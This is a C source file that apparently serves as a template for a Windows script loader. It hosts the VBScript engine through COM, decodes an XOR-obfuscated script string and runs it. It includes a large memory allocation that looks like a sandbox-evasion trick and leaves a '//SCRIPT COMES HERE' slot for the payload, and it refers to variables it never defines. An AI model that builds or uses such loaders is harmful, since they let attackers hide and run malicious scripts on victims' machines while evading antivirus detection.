#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <ObjBase.h>
#include <ActivScp.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>

#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")


typedef struct {
    IActiveScriptSite       site;
    IActiveScriptSiteWindow siteWnd; 
    ULONG                   m_cRef;
} MyIActiveScriptSite;

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this);

static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    if(ppv == NULL) return E_POINTER;
    
    // we implement the following interfaces
    if(IsEqualIID(&IID_IUnknown,          riid) || 
       IsEqualIID(&IID_IActiveScriptSite, riid)) 
    {
      *ppv = (LPVOID)this;
      AddRef(this);
      return S_OK;
    } 
    *ppv = NULL;
    return E_NOINTERFACE;
}

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
  
    _InterlockedIncrement(&mas->m_cRef);
    return mas->m_cRef;
}

static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
    
    ULONG ulRefCount = _InterlockedDecrement(&mas->m_cRef);  
    return ulRefCount;
}

static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, 
  LPCOLESTR objectName, DWORD dwReturnMask, 
  IUnknown **objPtr, ITypeInfo **ppti) 
{
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    return S_OK;
}

static STDMETHODIMP OnScriptError(IActiveScriptSite *this, 
  IActiveScriptError *scriptError) 
{
    return S_OK;
}

static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *plcid) {
    return S_OK;
}

static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version) {
    return S_OK;
}

static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, 
  const VARIANT *pvr, const EXCEPINFO *pei) 
{
    return S_OK;
}

static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state) {
    return S_OK;
}

static STDMETHODIMP OnEnterScript(IActiveScriptSite *this) {
    return S_OK;
}

static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
    return S_OK;
}

void d(char *array, int array_size, char *se)
{
    int i;
    for(i = 0; i < array_size; i++) {
        array[i] = (array[i]-1) ^ se[i % strlen(se)];
    }
        
}


VOID r(PWCHAR lang, char* s, char* se) {
    char *mem = NULL;
    mem = (char *) malloc(100000000);

    if (mem != NULL) {
        memset(mem, 00, 100000000);
        free(mem);
    }

    int length = strlen(s);
    d(s, length, se);
    PCHAR sc = s;

    IActiveScriptParse     *parser;
    IActiveScript          *engine;
    MyIActiveScriptSite    mas;
    IActiveScriptSiteVtbl  vft;
    LPVOID                 cs;
    DWORD                  len;
    CLSID                  langId;
    HRESULT                hr;
    OLECHAR* obj;
    
    // 1. Initialize IActiveScript based on language
    CLSIDFromProgID(lang, &langId);
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    CoCreateInstance(
      &langId, 0, CLSCTX_INPROC_SERVER, 
      &IID_IActiveScript, (void **)&engine);
    
    // 2. Query engine for script parser and initialize
    engine->lpVtbl->QueryInterface(
        engine, &IID_IActiveScriptParse, 
        (void **)&parser);
        
    parser->lpVtbl->InitNew(parser);
    
    // 3. Initialize IActiveScriptSite interface
    vft.QueryInterface      = (LPVOID)QueryInterface;
    vft.AddRef              = (LPVOID)AddRef;
    vft.Release             = (LPVOID)Release;
    vft.GetLCID             = (LPVOID)GetLCID;
    vft.GetItemInfo         = (LPVOID)GetItemInfo;
    vft.GetDocVersionString = (LPVOID)GetDocVersionString;
    vft.OnScriptTerminate   = (LPVOID)OnScriptTerminate;
    vft.OnStateChange       = (LPVOID)OnStateChange;
    vft.OnScriptError       = (LPVOID)OnScriptError;
    vft.OnEnterScript       = (LPVOID)OnEnterScript;
    vft.OnLeaveScript       = (LPVOID)OnLeaveScript;
    
    mas.site.lpVtbl     = (IActiveScriptSiteVtbl*)&vft;
    mas.siteWnd.lpVtbl  = NULL;
    mas.m_cRef          = 0;
    
    
    engine->lpVtbl->SetScriptSite(
        engine, (IActiveScriptSite *)&mas);
        
    len = MultiByteToWideChar(CP_ACP, 0, sc, -1, NULL, 0);
    cs = malloc(len * sizeof(WCHAR));
    
    len = MultiByteToWideChar(CP_ACP, 0, sc, -1, cs, len * sizeof(WCHAR));

    parser->lpVtbl->ParseScriptText(
         parser, cs, 0, 0, 0, 0, 0, 0, 0, 0);  
    
    engine->lpVtbl->SetScriptState(
         engine, SCRIPTSTATE_CONNECTED);
    
    // 5. cleanup
    parser->lpVtbl->Release(parser);
    engine->lpVtbl->Close(engine);
    engine->lpVtbl->Release(engine);
    free(cs);
}

int main(int argc, char *argv[]) {

    wchar_t *l = L"VBScript";

    //SCRIPT COMES HERE
    
    r(l, sc, s);
    return 0;
}